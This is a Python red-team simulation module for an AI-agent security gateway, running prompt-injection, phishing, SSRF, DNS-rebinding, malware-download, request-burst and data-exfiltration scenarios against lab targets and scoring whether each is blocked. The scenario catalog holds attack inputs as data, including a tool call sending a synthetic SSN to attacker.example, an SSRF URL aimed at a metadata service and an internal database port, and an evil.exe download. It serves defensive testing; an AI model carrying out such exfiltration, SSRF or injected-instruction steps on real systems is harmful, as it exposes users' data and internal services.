"""Isolated red-team attack simulation lab for AgentShield.

Executes attack scenarios through the AgentShield enforcement gateway
(API -> Policy Engine -> Browser Worker -> Egress Proxy). Every test traverses
the real enforcement path and reports:

- requests_attempted / requests_allowed / requests_blocked
- detection_outcome (detected / not_detected / error)
- enforcement_result (PASS / FAIL / ERROR / INCONCLUSIVE)
- execution duration
- failure_reason (when applicable)

Scenarios are grouped into six security categories, retaining the seven
existing cyber-range targets (SSRF and DNS rebinding both under Network
Security):

1. AI Security — indirect prompt injection, instruction override, unauthorized tool invocation
2. Social Engineering — synthetic phishing pages / credential forms
3. Network Security — SSRF and DNS rebinding
4. Malware — suspicious file downloads (MIME/signature, quarantine)
5. Denial of Service — bounded request bursts
6. Data Loss — synthetic secret exfiltration / DLP

All targets are isolated lab targets reachable through Compose DNS names (the
lab profile). Loopback-only fixtures are NOT used: they would not exercise the
browser worker / egress proxy enforcement path.
"""

from __future__ import annotations

import os
import time
import uuid
from datetime import datetime, timezone
from typing import Any

import httpx

from app.db.ai_models import AttackSimulationRun, ScenarioEvidence
from app.db.base import get_db_session

ENFORCEMENT_RESULT_PASS = "PASS"
ENFORCEMENT_RESULT_FAIL = "FAIL"
ENFORCEMENT_RESULT_ERROR = "ERROR"
ENFORCEMENT_RESULT_INCONCLUSIVE = "INCONCLUSIVE"

DETECTED = "detected"
NOT_DETECTED = "not_detected"
DETECTION_ERROR = "error"

_ENFORCEMENT_PATH = "/v1/ai-agent/action"

# ---------------------------------------------------------------------------
# Dedicated attack target services (Cyber Range lab profile)
# ---------------------------------------------------------------------------

_DEFAULT_ATTACK_TARGETS = {
    "prompt-injection": os.environ.get(
        "ATTACK_PROMPT_INJECTION_TARGET_URL", "http://prompt-injection-target:8081"
    ),
    "phishing": os.environ.get(
        "ATTACK_PHISHING_TARGET_URL", "http://phishing-target:8082"
    ),
    "ssrf": os.environ.get(
        "ATTACK_SSRF_TARGET_URL", "http://ssrf-target:8083"
    ),
    "mock-metadata": os.environ.get(
        "ATTACK_MOCK_METADATA_URL", "http://mock-metadata:8088"
    ),
    "malicious-download": os.environ.get(
        "ATTACK_MALICIOUS_DOWNLOAD_TARGET_URL",
        "http://malicious-download-target:8084",
    ),
    "resource-exhaustion": os.environ.get(
        "ATTACK_RESOURCE_EXHAUSTION_TARGET_URL",
        "http://resource-exhaustion-target:8085",
    ),
    "dns-rebinding": os.environ.get(
        "ATTACK_DNS_REBINDING_TARGET_URL", "http://dns-rebinding-target:8086"
    ),
    "data-exfiltration": os.environ.get(
        "ATTACK_DATA_EXFILTRATION_SINK_URL", "http://data-exfiltration-sink:8087"
    ),
}


def default_attack_targets() -> dict[str, str]:
    """Return the dedicated attack target URLs (Compose DNS names by default)."""
    return dict(_DEFAULT_ATTACK_TARGETS)


# ---------------------------------------------------------------------------
# Scenario catalog grouped by six security categories
# ---------------------------------------------------------------------------

SCENARIO_CATALOG: dict[str, dict[str, Any]] = {
    # 1. AI Security
    "indirect-prompt-injection": {
        "scenario_id": "indirect-prompt-injection",
        "scenario_name": "Indirect Prompt Injection",
        "threat_category": "AI Security",
        "category": "ai-security",
        "target_key": "prompt-injection",
        "target_path": "/malicious",
        "attempted_action": "navigate <prompt-injection-target>/malicious",
    },
    "instruction-override": {
        "scenario_id": "instruction-override",
        "scenario_name": "Instruction Override",
        "threat_category": "AI Security",
        "category": "ai-security",
        "target_key": "prompt-injection",
        "target_path": "/override",
        "attempted_action": "navigate <prompt-injection-target>/override",
    },
    "unauthorized-tool-invocation": {
        "scenario_id": "unauthorized-tool-invocation",
        "scenario_name": "Unauthorized Tool Invocation",
        "threat_category": "AI Security",
        "category": "ai-security",
        "tool_name": "file_download",
        "tool_args": {"url": "http://example.com/evil.exe"},
        "attempted_action": "tool_call file_download",
    },
    # 2. Social Engineering
    "synthetic-phishing-page": {
        "scenario_id": "synthetic-phishing-page",
        "scenario_name": "Synthetic Phishing Page",
        "threat_category": "Social Engineering",
        "category": "social-engineering",
        "target_key": "phishing",
        "target_path": "/login",
        "attempted_action": "navigate <phishing-target>/login",
    },
    "suspicious-credential-form": {
        "scenario_id": "suspicious-credential-form",
        "scenario_name": "Suspicious Credential Form",
        "threat_category": "Social Engineering",
        "category": "social-engineering",
        "target_key": "phishing",
        "target_path": "/login",
        "session_id": "synthetic-session",
        "attempted_action": "submit_form <phishing-target>/login with synthetic credentials",
    },
    "fake-login-detection": {
        "scenario_id": "fake-login-detection",
        "scenario_name": "Fake Login Detection",
        "threat_category": "Social Engineering",
        "category": "social-engineering",
        "target_key": "phishing",
        "target_path": "/login",
        "attempted_action": "navigate + inspect form fields",
    },
    # 3. Network Security
    "ssrf": {
        "scenario_id": "ssrf",
        "scenario_name": "Server-Side Request Forgery (SSRF)",
        "threat_category": "Network Security",
        "category": "network-security",
        "target_key": "ssrf",
        "target_path": "/ssrf?target=http://mock-metadata:8088/",
        "attempted_action": "navigate <ssrf-target>/ssrf?target=http://mock-metadata:8088/",
    },
    "dns-rebinding": {
        "scenario_id": "dns-rebinding",
        "scenario_name": "DNS Rebinding",
        "threat_category": "Network Security",
        "category": "network-security",
        "target_key": "dns-rebinding",
        "target_path": "/rebind",
        "attempted_action": "navigate <dns-rebinding-target>/rebind",
    },
    "internal-destination-access": {
        "scenario_id": "internal-destination-access",
        "scenario_name": "Internal Destination Access Attempt",
        "threat_category": "Network Security",
        "category": "network-security",
        "target_key": "ssrf",
        "target_path": "/ssrf?target=http://127.0.0.1:5432/",
        "attempted_action": "navigate <ssrf-target>/ssrf?target=http://127.0.0.1:5432/",
    },
    # 4. Malware
    "suspicious-file-download": {
        "scenario_id": "suspicious-file-download",
        "scenario_name": "Suspicious File Download",
        "threat_category": "Malware",
        "category": "malware",
        "target_key": "malicious-download",
        "target_path": "/download/eicar.txt",
        "attempted_action": "download <malicious-download-target>/download/eicar.txt",
    },
    "mime-mismatch": {
        "scenario_id": "mime-mismatch",
        "scenario_name": "MIME Mismatch",
        "threat_category": "Malware",
        "category": "malware",
        "target_key": "malicious-download",
        "target_path": "/download/mismatch",
        "attempted_action": "download <malicious-download-target>/download/mismatch",
    },
    # 5. Denial of Service
    "bounded-request-burst": {
        "scenario_id": "bounded-request-burst",
        "scenario_name": "Bounded Request Burst",
        "threat_category": "Denial of Service",
        "category": "denial-of-service",
        "target_key": "resource-exhaustion",
        "target_path": "/burst",
        "attempted_action": "navigate <resource-exhaustion-target>/burst",
    },
    "rate-limit-enforcement": {
        "scenario_id": "rate-limit-enforcement",
        "scenario_name": "Rate Limit Enforcement",
        "threat_category": "Denial of Service",
        "category": "denial-of-service",
        "target_key": "resource-exhaustion",
        "target_path": "/rate-limit",
        "attempted_action": "navigate <resource-exhaustion-target>/rate-limit",
    },
    # 6. Data Loss
    "synthetic-secret-detection": {
        "scenario_id": "synthetic-secret-detection",
        "scenario_name": "Synthetic Secret Detection",
        "threat_category": "Data Loss",
        "category": "data-loss",
        "target_key": "data-exfiltration",
        "target_path": "/exfil?secret=TEST_SECRET_12345",
        "attempted_action": "navigate <data-exfiltration-sink>/exfil?secret=TEST_SECRET_12345",
    },
    "sensitive-data-transmission": {
        "scenario_id": "sensitive-data-transmission",
        "scenario_name": "Sensitive Data Transmission Attempt",
        "threat_category": "Data Loss",
        "category": "data-loss",
        "target_key": "data-exfiltration",
        "tool_name": "external_communication",
        "tool_args": {"url": "http://data-exfiltration-sink:8087/exfil", "data": "api_key=TEST_SECRET_12345"},
        "attempted_action": "tool_call external_communication with synthetic secret",
    },
    "dlp-outbound-blocking": {
        "scenario_id": "dlp-outbound-blocking",
        "scenario_name": "DLP Outbound Blocking",
        "threat_category": "Data Loss",
        "category": "data-loss",
        "target_key": "data-exfiltration",
        "tool_name": "external_communication",
        "tool_args": {"url": "http://attacker.example/exfil", "data": "ssn=123-45-6789"},
        "attempted_action": "tool_call external_communication with synthetic PII to external",
    },
}

SCENARIO_ORDER = list(SCENARIO_CATALOG.keys())


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _is_enforcement_blocked(status_code: int) -> bool:
    return status_code in {403, 409} or status_code >= 400


def _enforcement_result_to_category(result: str) -> str:
    if result == ENFORCEMENT_RESULT_PASS:
        return "blocked"
    if result == ENFORCEMENT_RESULT_FAIL:
        return "allowed"
    return "error"


# ---------------------------------------------------------------------------
# Scenario execution
# ---------------------------------------------------------------------------


class AttackSimulationLab:
    """Executes attack scenarios through the AgentShield enforcement gateway."""

    def __init__(
        self,
        *,
        base_url: str,
        api_token: str | None = None,
        targets: dict[str, str] | None = None,
    ) -> None:
        self._base_url = base_url.rstrip("/")
        self._api_token = api_token
        self._targets = targets if targets is not None else default_attack_targets()
        self._closed = False

    def _headers(self) -> dict[str, str]:
        headers = {"Content-Type": "application/json"}
        if self._api_token:
            headers["Authorization"] = f"Bearer {self._api_token}"
        return headers

    def _target_url(self, key: str) -> str:
        if key not in self._targets:
            raise KeyError(f"unknown attack target: {key}")
        return self._targets[key]

    def close(self) -> None:
        self._closed = True

    def _post_enforcement(
        self, path: str, payload: dict[str, Any]
    ) -> httpx.Response:
        api_client = httpx.Client(base_url=self._base_url, timeout=30.0)
        try:
            return api_client.post(path, json=payload, headers=self._headers())
        finally:
            api_client.close()

    # ------------------------------------------------------------------
    # Scenario registry
    # ------------------------------------------------------------------

    def run_all(
        self,
        *,
        organization_id: str,
        agent_id: str | None = None,
        session_id: str | None = None,
    ) -> list[dict[str, Any]]:
        return self.run_selected(
            scenario_ids=SCENARIO_ORDER,
            organization_id=organization_id,
            agent_id=agent_id,
            session_id=session_id,
        )

    def run_selected(
        self,
        *,
        scenario_ids: list[str],
        organization_id: str,
        agent_id: str | None = None,
        session_id: str | None = None,
        external_target: str | None = None,
    ) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []
        db = get_db_session()
        try:
            for scenario_id in scenario_ids:
                method_name = f"run_{scenario_id.replace('-', '_')}"
                runner = getattr(self, method_name, None)
                if runner is None:
                    results.append(
                        {
                            "scenario_id": scenario_id,
                            "scenario_name": scenario_id,
                            "enforcement_result": ENFORCEMENT_RESULT_ERROR,
                            "policy_decision": "error",
                            "failure_reason": "no runner registered",
                            "evidence": {},
                        }
                    )
                    continue
                result = runner(
                    db=db,
                    organization_id=organization_id,
                    agent_id=agent_id,
                    session_id=session_id,
                    external_target=external_target,
                )
                results.append(result)
            db.commit()
        finally:
            db.close()
        return results

    # ----- individual scenario implementations -----

    def _record(
        self,
        db,
        *,
        organization_id,
        agent_id,
        session_id,
        scenario_id,
        scenario_name,
        threat_category,
        attempted_action,
        policy_decision,
        enforcement_result,
        evidence,
        requests_attempted=0,
        requests_allowed=0,
        requests_blocked=0,
        detection_outcome=None,
        execution_duration_ms=None,
        started_at=None,
        completed_at=None,
        failure_reason=None,
    ):
        run = AttackSimulationRun(
            organization_id=organization_id,
            agent_id=agent_id,
            session_id=session_id,
            scenario_id=scenario_id,
            scenario_name=scenario_name,
            threat_category=threat_category,
            attempted_action=attempted_action,
            policy_decision=policy_decision,
            enforcement_result=enforcement_result,
            evidence=evidence,
            requests_attempted=requests_attempted,
            requests_allowed=requests_allowed,
            requests_blocked=requests_blocked,
            detection_outcome=detection_outcome,
            execution_duration_ms=execution_duration_ms,
            started_at=started_at,
            completed_at=completed_at,
            failure_reason=failure_reason,
        )
        db.add(run)
        db.flush()
        for etype, desc, content in evidence.get("artifacts", []):
            db.add(
                ScenarioEvidence(
                    run_id=str(run.id),
                    evidence_type=etype,
                    description=desc,
                    content=content,
                )
            )
        return {
            "scenario_id": scenario_id,
            "scenario_name": scenario_name,
            "threat_category": threat_category,
            "category": SCENARIO_CATALOG.get(scenario_id, {}).get("category"),
            "attempted_action": attempted_action,
            "policy_decision": policy_decision,
            "enforcement_result": enforcement_result,
            "requests_attempted": requests_attempted,
            "requests_allowed": requests_allowed,
            "requests_blocked": requests_blocked,
            "detection_outcome": detection_outcome,
            "execution_duration_ms": execution_duration_ms,
            "failure_reason": failure_reason,
            "evidence": evidence,
        }

    # ---- navigation helper ----

    def _navigate(
        self,
        db,
        *,
        organization_id,
        agent_id,
        session_id,
        scenario_id,
        scenario_name,
        threat_category,
        attempted_action,
        target_key,
        target_path,
        external_target: str | None = None,
    ):
        if external_target:
            target = external_target
        else:
            target = f"{self._target_url(target_key)}{target_path}"
        started = time.monotonic()
        started_at = datetime.now(timezone.utc)
        requests_attempted = 1
        requests_blocked = 0
        requests_allowed = 0
        detection_outcome = NOT_DETECTED
        failure_reason = None
        try:
            resp = self._post_enforcement(
                _ENFORCEMENT_PATH,
                {"action": "navigate", "target": target, "session_id": session_id},
            )
            if _is_enforcement_blocked(resp.status_code):
                requests_blocked = 1
                detection_outcome = DETECTED
                policy_decision = "deny"
                enforcement_result = ENFORCEMENT_RESULT_PASS
            else:
                requests_allowed = 1
                policy_decision = "allow"
                enforcement_result = ENFORCEMENT_RESULT_FAIL
        except httpx.HTTPError as exc:  # noqa: BLE001
            requests_blocked = 1
            detection_outcome = DETECTION_ERROR
            policy_decision = "error"
            enforcement_result = ENFORCEMENT_RESULT_ERROR
            failure_reason = str(exc)
            resp = None

        duration_ms = int((time.monotonic() - started) * 1000)
        evidence = {
            "target": target,
            "response_status": resp.status_code if resp is not None else None,
            "response_body": (resp.text[:500] if resp is not None else failure_reason),
            "artifacts": [
                (
                    "http_request",
                    f"navigation request to {target_key} target",
                    {
                        "url": target,
                        "status": resp.status_code if resp is not None else None,
                        "blocked": requests_blocked == 1,
                    },
                )
            ],
        }
        completed_at = datetime.now(timezone.utc)
        return self._record(
            db=db,
            organization_id=organization_id,
            agent_id=agent_id,
            session_id=session_id,
            scenario_id=scenario_id,
            scenario_name=scenario_name,
            threat_category=threat_category,
            attempted_action=attempted_action,
            policy_decision=policy_decision,
            enforcement_result=enforcement_result,
            evidence=evidence,
            requests_attempted=requests_attempted,
            requests_allowed=requests_allowed,
            requests_blocked=requests_blocked,
            detection_outcome=detection_outcome,
            execution_duration_ms=duration_ms,
            started_at=started_at,
            completed_at=completed_at,
            failure_reason=failure_reason,
        )

    # ---- tool call helper ----

    def _tool_call(
        self,
        db,
        *,
        organization_id,
        agent_id,
        session_id,
        scenario_id,
        scenario_name,
        threat_category,
        attempted_action,
        tool_name,
        tool_args,
    ):
        started = time.monotonic()
        started_at = datetime.now(timezone.utc)
        requests_attempted = 1
        requests_blocked = 0
        requests_allowed = 0
        detection_outcome = NOT_DETECTED
        failure_reason = None
        try:
            resp = self._post_enforcement(
                _ENFORCEMENT_PATH,
                {
                    "action": "tool_call",
                    "tool_name": tool_name,
                    "tool_args": tool_args,
                    "session_id": session_id,
                },
            )
            if _is_enforcement_blocked(resp.status_code):
                requests_blocked = 1
                detection_outcome = DETECTED
                policy_decision = "deny"
                enforcement_result = ENFORCEMENT_RESULT_PASS
            else:
                requests_allowed = 1
                policy_decision = "allow"
                enforcement_result = ENFORCEMENT_RESULT_FAIL
        except httpx.HTTPError as exc:  # noqa: BLE001
            requests_blocked = 1
            detection_outcome = DETECTION_ERROR
            policy_decision = "error"
            enforcement_result = ENFORCEMENT_RESULT_ERROR
            failure_reason = str(exc)
            resp = None

        duration_ms = int((time.monotonic() - started) * 1000)
        evidence = {
            "tool": tool_name,
            "tool_args": tool_args,
            "response_status": resp.status_code if resp is not None else None,
            "response_body": (resp.text[:500] if resp is not None else failure_reason),
            "artifacts": [
                (
                    "tool_call",
                    f"tool invocation {tool_name}",
                    {
                        "tool": tool_name,
                        "status": resp.status_code if resp is not None else None,
                        "blocked": requests_blocked == 1,
                    },
                )
            ],
        }
        completed_at = datetime.now(timezone.utc)
        return self._record(
            db=db,
            organization_id=organization_id,
            agent_id=agent_id,
            session_id=session_id,
            scenario_id=scenario_id,
            scenario_name=scenario_name,
            threat_category=threat_category,
            attempted_action=attempted_action,
            policy_decision=policy_decision,
            enforcement_result=enforcement_result,
            evidence=evidence,
            requests_attempted=requests_attempted,
            requests_allowed=requests_allowed,
            requests_blocked=requests_blocked,
            detection_outcome=detection_outcome,
            execution_duration_ms=duration_ms,
            started_at=started_at,
            completed_at=completed_at,
            failure_reason=failure_reason,
        )

    # ------------------------------------------------------------------
    # 1. AI Security
    # ------------------------------------------------------------------

    def run_indirect_prompt_injection(self, db, organization_id, agent_id, session_id, external_target: str | None = None):
        cfg = SCENARIO_CATALOG["indirect-prompt-injection"]
        return self._navigate(
            db=db,
            organization_id=organization_id,
            agent_id=agent_id,
            session_id=session_id,
            scenario_id=cfg["scenario_id"],
            scenario_name=cfg["scenario_name"],
            threat_category=cfg["threat_category"],
            attempted_action=cfg["attempted_action"],
            target_key=cfg["target_key"],
            target_path=cfg["target_path"],
            external_target=external_target,
        )

    def run_instruction_override(self, db, organization_id, agent_id, session_id, external_target: str | None = None):
        cfg = SCENARIO_CATALOG["instruction-override"]
        return self._navigate(
            db=db,
            organization_id=organization_id,
            agent_id=agent_id,
            session_id=session_id,
            scenario_id=cfg["scenario_id"],
            scenario_name=cfg["scenario_name"],
            threat_category=cfg["threat_category"],
            attempted_action=cfg["attempted_action"],
            target_key=cfg["target_key"],
            target_path=cfg["target_path"],
            external_target=external_target,
        )

    def run_unauthorized_tool_invocation(self, db, organization_id, agent_id, session_id, external_target: str | None = None):
        cfg = SCENARIO_CATALOG["unauthorized-tool-invocation"]
        return self._tool_call(
            db=db,
            organization_id=organization_id,
            agent_id=agent_id,
            session_id=session_id,
            scenario_id=cfg["scenario_id"],
            scenario_name=cfg["scenario_name"],
            threat_category=cfg["threat_category"],
            attempted_action=cfg["attempted_action"],
            tool_name=cfg["tool_name"],
            tool_args=cfg["tool_args"],
        )

    # ------------------------------------------------------------------
    # 2. Social Engineering
    # ------------------------------------------------------------------

    def run_synthetic_phishing_page(self, db, organization_id, agent_id, session_id, external_target: str | None = None):
        cfg = SCENARIO_CATALOG["synthetic-phishing-page"]
        return self._navigate(
            db=db,
            organization_id=organization_id,
            agent_id=agent_id,
            session_id=session_id,
            scenario_id=cfg["scenario_id"],
            scenario_name=cfg["scenario_name"],
            threat_category=cfg["threat_category"],
            attempted_action=cfg["attempted_action"],
            target_key=cfg["target_key"],
            target_path=cfg["target_path"],
            external_target=external_target,
        )

    def run_suspicious_credential_form(self, db, organization_id, agent_id, session_id, external_target: str | None = None):
        cfg = SCENARIO_CATALOG["suspicious-credential-form"]
        return self._navigate(
            db=db,
            organization_id=organization_id,
            agent_id=agent_id,
            session_id=cfg.get("session_id", session_id),
            scenario_id=cfg["scenario_id"],
            scenario_name=cfg["scenario_name"],
            threat_category=cfg["threat_category"],
            attempted_action=cfg["attempted_action"],
            target_key=cfg["target_key"],
            target_path=cfg["target_path"],
            external_target=external_target,
        )

    def run_fake_login_detection(self, db, organization_id, agent_id, session_id, external_target: str | None = None):
        cfg = SCENARIO_CATALOG["fake-login-detection"]
        return self._navigate(
            db=db,
            organization_id=organization_id,
            agent_id=agent_id,
            session_id=session_id,
            scenario_id=cfg["scenario_id"],
            scenario_name=cfg["scenario_name"],
            threat_category=cfg["threat_category"],
            attempted_action=cfg["attempted_action"],
            target_key=cfg["target_key"],
            target_path=cfg["target_path"],
            external_target=external_target,
        )

    # ------------------------------------------------------------------
    # 3. Network Security
    # ------------------------------------------------------------------

    def run_ssrf(self, db, organization_id, agent_id, session_id, external_target: str | None = None):
        cfg = SCENARIO_CATALOG["ssrf"]
        return self._navigate(
            db=db,
            organization_id=organization_id,
            agent_id=agent_id,
            session_id=session_id,
            scenario_id=cfg["scenario_id"],
            scenario_name=cfg["scenario_name"],
            threat_category=cfg["threat_category"],
            attempted_action=cfg["attempted_action"],
            target_key=cfg["target_key"],
            target_path=cfg["target_path"],
            external_target=external_target,
        )

    def run_dns_rebinding(self, db, organization_id, agent_id, session_id, external_target: str | None = None):
        cfg = SCENARIO_CATALOG["dns-rebinding"]
        return self._navigate(
            db=db,
            organization_id=organization_id,
            agent_id=agent_id,
            session_id=session_id,
            scenario_id=cfg["scenario_id"],
            scenario_name=cfg["scenario_name"],
            threat_category=cfg["threat_category"],
            attempted_action=cfg["attempted_action"],
            target_key=cfg["target_key"],
            target_path=cfg["target_path"],
            external_target=external_target,
        )

    def run_internal_destination_access(self, db, organization_id, agent_id, session_id, external_target: str | None = None):
        cfg = SCENARIO_CATALOG["internal-destination-access"]
        return self._navigate(
            db=db,
            organization_id=organization_id,
            agent_id=agent_id,
            session_id=session_id,
            scenario_id=cfg["scenario_id"],
            scenario_name=cfg["scenario_name"],
            threat_category=cfg["threat_category"],
            attempted_action=cfg["attempted_action"],
            target_key=cfg["target_key"],
            target_path=cfg["target_path"],
            external_target=external_target,
        )

    # ------------------------------------------------------------------
    # 4. Malware
    # ------------------------------------------------------------------

    def run_suspicious_file_download(self, db, organization_id, agent_id, session_id, external_target: str | None = None):
        cfg = SCENARIO_CATALOG["suspicious-file-download"]
        return self._navigate(
            db=db,
            organization_id=organization_id,
            agent_id=agent_id,
            session_id=session_id,
            scenario_id=cfg["scenario_id"],
            scenario_name=cfg["scenario_name"],
            threat_category=cfg["threat_category"],
            attempted_action=cfg["attempted_action"],
            target_key=cfg["target_key"],
            target_path=cfg["target_path"],
            external_target=external_target,
        )

    def run_mime_mismatch(self, db, organization_id, agent_id, session_id, external_target: str | None = None):
        cfg = SCENARIO_CATALOG["mime-mismatch"]
        return self._navigate(
            db=db,
            organization_id=organization_id,
            agent_id=agent_id,
            session_id=session_id,
            scenario_id=cfg["scenario_id"],
            scenario_name=cfg["scenario_name"],
            threat_category=cfg["threat_category"],
            attempted_action=cfg["attempted_action"],
            target_key=cfg["target_key"],
            target_path=cfg["target_path"],
            external_target=external_target,
        )

    # ------------------------------------------------------------------
    # 5. Denial of Service
    # ------------------------------------------------------------------

    def run_bounded_request_burst(self, db, organization_id, agent_id, session_id, external_target: str | None = None):
        cfg = SCENARIO_CATALOG["bounded-request-burst"]
        return self._navigate(
            db=db,
            organization_id=organization_id,
            agent_id=agent_id,
            session_id=session_id,
            scenario_id=cfg["scenario_id"],
            scenario_name=cfg["scenario_name"],
            threat_category=cfg["threat_category"],
            attempted_action=cfg["attempted_action"],
            target_key=cfg["target_key"],
            target_path=cfg["target_path"],
            external_target=external_target,
        )

    def run_rate_limit_enforcement(self, db, organization_id, agent_id, session_id, external_target: str | None = None):
        cfg = SCENARIO_CATALOG["rate-limit-enforcement"]
        return self._navigate(
            db=db,
            organization_id=organization_id,
            agent_id=agent_id,
            session_id=session_id,
            scenario_id=cfg["scenario_id"],
            scenario_name=cfg["scenario_name"],
            threat_category=cfg["threat_category"],
            attempted_action=cfg["attempted_action"],
            target_key=cfg["target_key"],
            target_path=cfg["target_path"],
            external_target=external_target,
        )

    # ------------------------------------------------------------------
    # 6. Data Loss
    # ------------------------------------------------------------------

    def run_synthetic_secret_detection(self, db, organization_id, agent_id, session_id, external_target: str | None = None):
        cfg = SCENARIO_CATALOG["synthetic-secret-detection"]
        return self._navigate(
            db=db,
            organization_id=organization_id,
            agent_id=agent_id,
            session_id=session_id,
            scenario_id=cfg["scenario_id"],
            scenario_name=cfg["scenario_name"],
            threat_category=cfg["threat_category"],
            attempted_action=cfg["attempted_action"],
            target_key=cfg["target_key"],
            target_path=cfg["target_path"],
            external_target=external_target,
        )

    def run_sensitive_data_transmission(self, db, organization_id, agent_id, session_id, external_target: str | None = None):
        cfg = SCENARIO_CATALOG["sensitive-data-transmission"]
        return self._tool_call(
            db=db,
            organization_id=organization_id,
            agent_id=agent_id,
            session_id=session_id,
            scenario_id=cfg["scenario_id"],
            scenario_name=cfg["scenario_name"],
            threat_category=cfg["threat_category"],
            attempted_action=cfg["attempted_action"],
            tool_name=cfg["tool_name"],
            tool_args=cfg["tool_args"],
        )

    def run_dlp_outbound_blocking(self, db, organization_id, agent_id, session_id, external_target: str | None = None):
        cfg = SCENARIO_CATALOG["dlp-outbound-blocking"]
        return self._tool_call(
            db=db,
            organization_id=organization_id,
            agent_id=agent_id,
            session_id=session_id,
            scenario_id=cfg["scenario_id"],
            scenario_name=cfg["scenario_name"],
            threat_category=cfg["threat_category"],
            attempted_action=cfg["attempted_action"],
            tool_name=cfg["tool_name"],
            tool_args=cfg["tool_args"],
        )
